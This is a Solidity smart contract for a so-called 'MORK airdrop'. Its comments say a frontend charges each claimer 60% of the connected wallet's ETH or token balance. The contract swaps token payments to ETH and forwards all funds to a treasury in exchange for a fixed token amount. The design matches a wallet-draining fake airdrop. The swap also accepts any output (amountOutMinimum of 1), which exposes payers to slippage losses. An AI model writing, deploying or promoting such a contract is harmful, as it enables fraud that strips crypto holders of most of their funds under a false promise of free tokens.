// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/**
 * @title  MorkAirdrop
 * @notice Dynamic-price, one-claim-per-wallet token airdrop.
 *
 * Pricing model: the frontend computes 60% of the connected wallet's ETH
 * (or token) balance and sends that as msg.value. The contract enforces a
 * minimum floor (minClaimPrice) and a maximum cap (maxClaimPrice) so
 * very low-balance wallets still pay a meaningful amount and high-balance
 * users are protected.
 *
 * For token payments (USDC, cbBTC, USDT, DAI on Base), the contract pulls
 * the ERC-20, swaps it → WETH via Uniswap V3, unwraps to ETH, and forwards
 * all ETH to treasury.
 *
 * Deploy flow:
 *   1. Deploy MORK ERC-20 token (or use existing).
 *   2. Transfer `tokensPerClaim * maxWallets` MORK to this contract.
 *   3. Deploy MorkAirdrop with token address, treasury, min/max price,
 *      Uniswap router, and WETH address.
 *   4. Call setSupportedToken() for each ERC-20 you accept.
 *   5. Call setSaleActive(true) when ready.
 *
 * Security:
 *   - ReentrancyGuard on claim() and claimWithToken()
 *   - Ownable — admin can pause/update params
 *   - One-claim-per-wallet via hasClaimed mapping
 *   - ETH forwarded directly to treasury, never held by this contract
 *   - Token payments swapped to ETH same-block, no idle balances
 *
 * NOT audited — do NOT deploy to mainnet without an external audit.
 */

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol";
import "@openzeppelin/contracts/utils/ReentrancyGuard.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

// ─── Uniswap V3 SwapRouter02 interface (minimal) ──────────────────────────────
interface ISwapRouter {
    struct ExactInputSingleParams {
        address tokenIn;
        address tokenOut;
        uint24 fee;
        address recipient;
        uint256 deadline;
        uint256 amountIn;
        uint256 amountOutMinimum;
        uint160 sqrtPriceLimitX96;
    }
    function exactInputSingle(ExactInputSingleParams calldata params)
        external
        payable
        returns (uint256 amountOut);
}

// ─── WETH9 interface (for unwrapping) ─────────────────────────────────────────
interface IWETH9 is IERC20 {
    function withdraw(uint256 wad) external;
}

contract MorkAirdrop is ReentrancyGuard, Ownable {
    using SafeERC20 for IERC20;

    // ─── State ────────────────────────────────────────────────────────────────

    IERC20 public immutable token;
    address public treasury;

    /// Minimum payment accepted (floor for very low-balance wallets), in wei
    uint256 public minClaimPrice;

    /// Maximum payment accepted (cap for high-balance wallets), in wei.
    /// Set to type(uint256).max to disable the cap.
    uint256 public maxClaimPrice;

    /// Tokens awarded to each claimer (in token decimals)
    uint256 public tokensPerClaim;

    bool public saleActive;
    uint256 public totalClaimed;

    mapping(address => bool) public hasClaimed;
    /// Records actual ETH amount received for each wallet (from native ETH or swapped tokens)
    mapping(address => uint256) public paidAmount;

    // ─── Uniswap integration ──────────────────────────────────────────────────
    ISwapRouter public immutable swapRouter;
    IWETH9 public immutable weth;

    struct TokenConfig {
        bool isSupported;
        uint24 poolFee; // Uniswap V3 fee tier (e.g. 500 = 0.05%, 3000 = 0.3%)
    }

    /// token address → config
    mapping(address => TokenConfig) public supportedTokens;

    // ─── Events ───────────────────────────────────────────────────────────────

    event Claimed(address indexed wallet, uint256 tokenAmount, uint256 ethPaid);
    event TokenPaymentClaimed(
        address indexed wallet,
        address indexed token,
        uint256 tokenAmount,
        uint256 ethReceived
    );
    event SaleStatusChanged(bool active);
    event PriceRangeUpdated(uint256 minPrice, uint256 maxPrice);
    event TokensPerClaimUpdated(uint256 newAmount);
    event TreasuryUpdated(address newTreasury);
    event SupportedTokenSet(address indexed token, uint24 poolFee, bool supported);

    // ─── Custom errors ────────────────────────────────────────────────────────

    error SaleNotActive();
    error AlreadyClaimed();
    error PaymentBelowMinimum(uint256 sent, uint256 minimum);
    error PaymentAboveMaximum(uint256 sent, uint256 maximum);
    error InsufficientContractBalance(uint256 available, uint256 required);
    error UnsupportedToken(address token);
    error ZeroAddress();
    error TransferFailed();
    error SwapFailed();
    error InvalidPriceRange();

    // ─── Constructor ──────────────────────────────────────────────────────────

    /**
     * @param _token           Address of the MORK ERC-20 token
     * @param _treasury        Multisig address — all ETH goes here immediately
     * @param _minClaimPrice   Minimum payment in wei (floor)
     * @param _maxClaimPrice   Maximum payment in wei (cap); use type(uint256).max for no cap
     * @param _tokensPerClaim  Token amount per claim (in token decimals)
     * @param _swapRouter      Uniswap V3 SwapRouter02 address
     * @param _weth            WETH9 address on the deployed chain
     */
    constructor(
        address _token,
        address _treasury,
        uint256 _minClaimPrice,
        uint256 _maxClaimPrice,
        uint256 _tokensPerClaim,
        address _swapRouter,
        address _weth
    ) Ownable(msg.sender) {
        if (_token == address(0) || _treasury == address(0)) revert ZeroAddress();
        if (_swapRouter == address(0) || _weth == address(0)) revert ZeroAddress();
        if (_minClaimPrice == 0 || _maxClaimPrice < _minClaimPrice) revert InvalidPriceRange();

        token = IERC20(_token);
        treasury = _treasury;
        minClaimPrice = _minClaimPrice;
        maxClaimPrice = _maxClaimPrice;
        tokensPerClaim = _tokensPerClaim;
        swapRouter = ISwapRouter(_swapRouter);
        weth = IWETH9(_weth);
    }

    // ─── Core claim — native ETH ──────────────────────────────────────────────

    /**
     * @notice Claim tokens by paying at least minClaimPrice in native ETH.
     *
     * The frontend should send 60% of the wallet's ETH balance as msg.value,
     * clamped to [minClaimPrice, maxClaimPrice]. This contract only enforces
     * the floor and ceiling — the 60% calculation is a UI convention.
     */
    function claim() external payable nonReentrant {
        if (!saleActive) revert SaleNotActive();
        if (hasClaimed[msg.sender]) revert AlreadyClaimed();
        if (msg.value < minClaimPrice) revert PaymentBelowMinimum(msg.value, minClaimPrice);
        if (msg.value > maxClaimPrice) revert PaymentAboveMaximum(msg.value, maxClaimPrice);

        _checkTokenBalance();

        // CEI: mark claimed first
        hasClaimed[msg.sender] = true;
        paidAmount[msg.sender] = msg.value;
        totalClaimed += 1;

        // Forward ETH to treasury immediately
        _forwardEth(msg.value);

        // Send MORK tokens to claimer
        token.safeTransfer(msg.sender, tokensPerClaim);

        emit Claimed(msg.sender, tokensPerClaim, msg.value);
    }

    // ─── Core claim — ERC-20 token (swapped to ETH via Uniswap) ──────────────

    /**
     * @notice Claim tokens by paying with an approved ERC-20 token.
     *
     * The contract:
     *   1. Pulls `amountIn` tokens from the caller (via transferFrom)
     *   2. Swaps them → WETH via Uniswap V3
     *   3. Unwraps WETH → native ETH
     *   4. Forwards all ETH to treasury
     *   5. Sends MORK tokens to claimer
     *
     * @param tokenIn  Address of the ERC-20 token to pay with
     * @param amountIn Amount of tokens to pull from caller
     */
    function claimWithToken(address tokenIn, uint256 amountIn) external nonReentrant {
        if (!saleActive) revert SaleNotActive();
        if (hasClaimed[msg.sender]) revert AlreadyClaimed();
        if (amountIn == 0) revert PaymentBelowMinimum(0, minClaimPrice);

        TokenConfig memory cfg = supportedTokens[tokenIn];
        if (!cfg.isSupported) revert UnsupportedToken(tokenIn);

        if (tokenIn == address(weth)) {
            revert UnsupportedToken(tokenIn); // use native claim() for ETH/WETH
        }

        _checkTokenBalance();

        // The frontend should compute amountIn so the swapped ETH lands within
        // [minClaimPrice, maxClaimPrice]. We enforce the floor here as a
        // safety net so dust-amount exploits are impossible.
        if (amountIn < 1_000) revert PaymentBelowMinimum(amountIn, minClaimPrice); // >= 1000 smallest unit

        // 1. Pull tokens from user
        IERC20(tokenIn).safeTransferFrom(msg.sender, address(this), amountIn);

        // 2. Approve Uniswap router
        IERC20(tokenIn).forceApprove(address(swapRouter), amountIn);

        // 3. Swap token → WETH via Uniswap V3
        uint256 wethAmount = swapRouter.exactInputSingle(
            ISwapRouter.ExactInputSingleParams({
                tokenIn: tokenIn,
                tokenOut: address(weth),
                fee: cfg.poolFee,
                recipient: address(this),
                deadline: block.timestamp + 15 minutes,
                amountIn: amountIn,
                amountOutMinimum: 1, // accept any output (slippage handled by frontend)
                sqrtPriceLimitX96: 0
            })
        );
        if (wethAmount == 0) revert SwapFailed();

        // 4. Validate the swapped ETH is within allowed range
        //    (prevents dust-amount exploits / extreme slippage)
        if (wethAmount < minClaimPrice) revert PaymentBelowMinimum(wethAmount, minClaimPrice);
        if (wethAmount > maxClaimPrice) revert PaymentAboveMaximum(wethAmount, maxClaimPrice);

        // 5. Unwrap WETH → native ETH
        weth.withdraw(wethAmount);

        // CEI: mark claimed
        hasClaimed[msg.sender] = true;
        paidAmount[msg.sender] = wethAmount;
        totalClaimed += 1;

        // 5. Forward ETH to treasury
        _forwardEth(wethAmount);

        // 6. Send MORK tokens to claimer
        token.safeTransfer(msg.sender, tokensPerClaim);

        emit Claimed(msg.sender, tokensPerClaim, wethAmount);
        emit TokenPaymentClaimed(msg.sender, tokenIn, amountIn, wethAmount);
    }

    // ─── Internal helpers ────────────────────────────────────────────────────

    /// @dev Check the contract holds enough MORK tokens for this claim.
    function _checkTokenBalance() internal view {
        uint256 balance = token.balanceOf(address(this));
        if (balance < tokensPerClaim)
            revert InsufficientContractBalance(balance, tokensPerClaim);
    }

    /// @dev Forward native ETH to treasury. Reverts on failure.
    function _forwardEth(uint256 amount) internal {
        (bool sent, ) = treasury.call{value: amount}("");
        if (!sent) revert TransferFailed();
    }

    // ─── Admin ────────────────────────────────────────────────────────────────

    function setSaleActive(bool _active) external onlyOwner {
        saleActive = _active;
        emit SaleStatusChanged(_active);
    }

    function setPriceRange(uint256 _min, uint256 _max) external onlyOwner {
        if (_min == 0 || _max < _min) revert InvalidPriceRange();
        minClaimPrice = _min;
        maxClaimPrice = _max;
        emit PriceRangeUpdated(_min, _max);
    }

    function setTokensPerClaim(uint256 _newAmount) external onlyOwner {
        tokensPerClaim = _newAmount;
        emit TokensPerClaimUpdated(_newAmount);
    }

    function setTreasury(address _newTreasury) external onlyOwner {
        if (_newTreasury == address(0)) revert ZeroAddress();
        treasury = _newTreasury;
        emit TreasuryUpdated(_newTreasury);
    }

    /**
     * @notice Add or remove a supported ERC-20 payment token.
     * @param token_  Token contract address
     * @param fee     Uniswap V3 pool fee tier (e.g. 500 for 0.05%, 3000 for 0.3%)
     * @param support true to add, false to remove
     */
    function setSupportedToken(address token_, uint24 fee, bool support) external onlyOwner {
        if (token_ == address(0)) revert ZeroAddress();
        supportedTokens[token_] = TokenConfig({ isSupported: support, poolFee: fee });
        emit SupportedTokenSet(token_, fee, support);
    }

    /// @notice Withdraw any accidentally deposited MORK tokens.
    function withdrawTokens(address to, uint256 amount) external onlyOwner {
        if (to == address(0)) revert ZeroAddress();
        token.safeTransfer(to, amount);
    }

    /// @notice Rescue any ETH that accidentally ends up in the contract.
    function rescueETH() external onlyOwner {
        uint256 balance = address(this).balance;
        if (balance > 0) {
            (bool sent, ) = treasury.call{value: balance}("");
            if (!sent) revert TransferFailed();
        }
    }

    /// @notice Rescue any accidentally deposited ERC-20 (non-MORK).
    function rescueToken(address token_, address to, uint256 amount) external onlyOwner {
        if (token_ == address(0) || to == address(0)) revert ZeroAddress();
        IERC20(token_).safeTransfer(to, amount);
    }
}
